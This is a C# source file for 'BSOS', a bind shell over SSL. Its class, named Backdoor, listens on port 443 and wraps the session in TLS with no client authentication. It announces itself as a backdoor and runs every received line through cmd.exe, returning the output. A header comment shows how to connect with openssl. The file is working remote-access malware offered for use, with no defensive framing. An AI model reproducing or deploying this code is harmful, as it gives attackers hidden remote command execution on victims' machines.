/*
 * BSOS [Bindshell over SSL] ver 3.0
 * console application coded in C# (FW Net 3.5) IDE Visual Studio CE 2019
 * by Zinzloun 
 * No more jokes
 * 
 * Client connection example ***************
 * 
 * openssl s_client -connect 192.168.1.5:443
 * 
 * 
 */



using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;
using System.Text;

namespace BindSSLShell
{
    class Program
    {
        static void Main(string[] args)
        {
            Backdoor._bind(443);
        }
    }

    public class Backdoor
    {

        /// <config>
        static string IP = "192.168.1.5";
        static int PORT = 443;
        /// </config>



        private TcpListener listener;
        private Socket mainSocket;
        private int port;
        private bool verbose;

        private StreamReader inStream;
        private StreamWriter outStream;


        //interface to use without initialize
        public static void _bind(Int32 port)
        {
            string name = IPAddress.Any.ToString();
            Backdoor bd = new Backdoor();
            bd.startServer(PORT, IP, true); ;
        }

        //start the server
        public void startServer(int porta, string localIP, bool verb)
        {
            try
            {

                port = porta;
                verbose = verb;
                IPAddress ip = IPAddress.Parse(localIP);

                if (verbose)
                    Console.WriteLine("Listening on " + ip.ToString() + ":" + port);



                //Create the ServerSocket
                listener = new TcpListener(ip, port);
                listener.Start();                                   //Stop and wait for a connection
                mainSocket = listener.AcceptSocket();

                if (verbose)
                    Console.WriteLine("Client connected: " + mainSocket.RemoteEndPoint);

                //load the certificate: leave the password empty, doesn't mind
                X509Certificate2 serverCertificate = new X509Certificate2("server.pfx", "");

                Stream sNS = new NetworkStream(mainSocket);

                //we create the SSL stream, no client authentication is required, we support SSL3 and TLS
                SslStream sslStream = new SslStream(sNS);
                sslStream.AuthenticateAsServer(serverCertificate, clientCertificateRequired: false, enabledSslProtocols: SslProtocols.Ssl3, checkCertificateRevocation: true);

                if (verbose)
                    DisplayCertificateInformation(sslStream);

                inStream = new StreamReader(sslStream);
                outStream = new StreamWriter(sslStream);
                outStream.AutoFlush = true;

                outStream.WriteLine("Welcome to BindSSLShellv2 backdoor. Issue help to get help\n");
                outStream.WriteLine("or issue any DOS command...\n");
                getInput();
                dropConnection();

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message + ": " + e.StackTrace.ToString());
                dropConnection();

            }
        }


        private void getInput()
        {
            try
            {
                String tempBuff = "";                                       //Prepare a string to hold client commands
                while (((tempBuff = inStream.ReadLine()) != null))
                {         //While the buffer is not null
                    if (verbose)
                        Console.WriteLine("Received command: " + tempBuff);
                    handleCommand(tempBuff);                                //Handle the client's commands
                }
            }
            catch (Exception) { }
        }

        private void handleCommand(String com)
        {        //Here we can catch commands before they are sent
            try
            {                                       //to the shell, so we could write our own if we want
                if (com.Equals("exit"))
                {                //In this case I catch the 'exit' command and use it
                    outStream.WriteLine("\n\nDropping the connection...");
                    dropConnection();                   //to drop the connection
                }
                else if (com.Equals("help"))
                {
                    outStream.WriteLine("You can issue DOS command, e.g. sc query type=service");
                    outStream.WriteLine("|_ commands inside double quote are processed as well, e.g. \"whoami && hostname\"");
                    outStream.WriteLine("|_ issue exit to close the session");
                }
                else
                {
                    string resCmd = Exec_cmd(com);
                    outStream.WriteLine(resCmd);
                }
            }
            catch (Exception) { dropConnection(); }
        }

        private string Exec_cmd(string cmd)
        {

            var processInfo = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };

            StringBuilder sb = new StringBuilder();
            Process p = Process.Start(processInfo);
            p.OutputDataReceived += (sender, args) => sb.AppendLine(args.Data);
            p.BeginOutputReadLine();
            p.WaitForExit();
            p.Close();
            p.Dispose();
            return sb.ToString();


        }


        private void dropConnection()
        {
            try
            {
                if (verbose)
                    Console.WriteLine("Dropping Connection");

                inStream.Dispose();                                 //Close everything...
                outStream.Dispose();

                mainSocket.Close();
                listener.Stop();
                return;
            }
            catch (Exception) { }
        }

        private static void DisplayCertificateInformation(SslStream stream)
        {
            Console.WriteLine("Certificate revocation list checked: {0}", stream.CheckCertRevocationStatus);

            X509Certificate localCertificate = stream.LocalCertificate;
            if (stream.LocalCertificate != null)
            {
                Console.WriteLine("Local cert was issued to {0} and is valid from {1} until {2}.",
                    localCertificate.Subject,
                    localCertificate.GetEffectiveDateString(),
                    localCertificate.GetExpirationDateString());
            }
            else
            {
                Console.WriteLine("Local certificate is null.");
            }

        }

    }


}
